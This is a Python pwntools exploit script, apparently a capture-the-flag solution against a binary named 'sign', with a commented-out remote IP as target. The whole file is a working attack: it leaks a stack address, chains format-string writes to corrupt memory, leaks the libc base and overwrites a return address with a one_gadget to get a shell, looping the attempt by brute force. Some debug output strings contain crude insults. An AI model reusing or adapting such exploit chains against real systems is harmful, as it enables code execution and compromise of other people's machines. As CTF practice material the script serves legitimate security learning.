from pwn import *

context.arch = 'amd64'


# context.log_level = 'debug'
def baopo():
    # p = remote('81.69.250.115', 8889)
    p = process('./sign')
    lib = ELF('./libc.so.6')

    p.recvuntil(b':')
    p.sendline(b'128')
    p.recvuntil(b':')
    p.send(b'a' * 128)
    addr1 = u64(p.recvuntil(b'\x7f', timeout=0.3)[-6:].ljust(8, b'\00'))
    print(hex(addr1), end='')
    if addr1 >> 40 != 0x7f:
        print("sb!!!!")
        p.close()
        return 0
    p.recvuntil(b'Now you have one time to change your name.')
    payload = b'%4640c%11$hn'
    payload = payload.ljust(24, b'a') + p64(addr1 - 0x198)
    try:
        p.sendline(payload)
        sleep(0.5)
        p.sendline(b'128')
        sleep(0.5)
        p.send(b'a' * 128)
        sleep(0.5)
    except:
        p.close()
        return 0
    payload = b'%16c%11$hhn' + b'%66c%12$hhn'
    payload = payload.ljust(24, b'a') + p64(addr1 - 0x1f8) + p64(addr1 - 0x328)
    try:
        p.sendline(payload)
    except:
        p.close()
        return 0
    sleep(0.5)
    payload = b'%82c%12$hhn' + b'%133c%11$hhn'
    payload = payload.ljust(24, b'a') + p64(addr1 - 0x1f8 + 1) + p64(addr1 - 0x328)
    try:
        p.sendline(payload)
    except:
        p.close()
        return 0
    sleep(0.5)
    payload = b'%2c%43$hhn' + b'%80c%11$hhn'
    payload = payload.ljust(24, b'a') + p64(addr1 - 0x328)
    try:
        # gdb.attach(p)
        # pause()
        p.sendline(payload)
        sleep(0.5)
        payload = b'%82c%11$hhn' + b'%27$p'
        payload = payload.ljust(24, b'a') + p64(addr1 - 0x328)
        p.sendline(payload)
        sleep(0.5)
        p.recvuntil(b'0x')
        base_addr = int(p.recv(12), 16) - 243 - lib.sym['__libc_start_main']
        print()
        print(hex(base_addr))

    except:
        print('==>nmsl', end='')
        p.close()
        return 0

    key = [0xe3afe, 0xe3b01, 0xe3b04]
    ogg = key[1] + base_addr
    print(hex(ogg))
    ogg1 = ogg & 0xff
    ogg2 = (ogg >> 8) & 0xff
    ogg3 = (ogg >> 16) & 0xff
    ogg_2_3 = (ogg >> 8) & 0xffff

    if ogg3 > ogg2:
        payload = b'%' + str(ogg1).encode() + b'c%13$hhn' + b'%' + str(ogg2 - 1).encode() + b'c%14$hhn' + b'%' \
                  + str(ogg3 - ogg2).encode() + b'c%15$hhn' + b'%27$p'
        payload = payload.ljust(40, b'a') + p64(addr1 - 0x328 + 0xb0) + p64(addr1 - 0x328 + 0xb0 + 1) + p64(
            addr1 - 0x328 + 0xb0 + 2)
        print(payload)
        gdb.attach(p)
        pause()
        p.sendline(payload)
    else:
        payload = b'%' + str(ogg1).encode() + b'c%13$hhn' + b'%' + str(ogg_2_3 - 1).encode() + b'c%14$hn' + b'%27$p'
        payload = payload.ljust(40, b'a') + p64(addr1 - 0x328 + 0xb0) + p64(addr1 - 0x328 + 0xb0 + 1)
        print(payload)
        gdb.attach(p)
        pause()
        p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    while True:
        baopo()
        print()
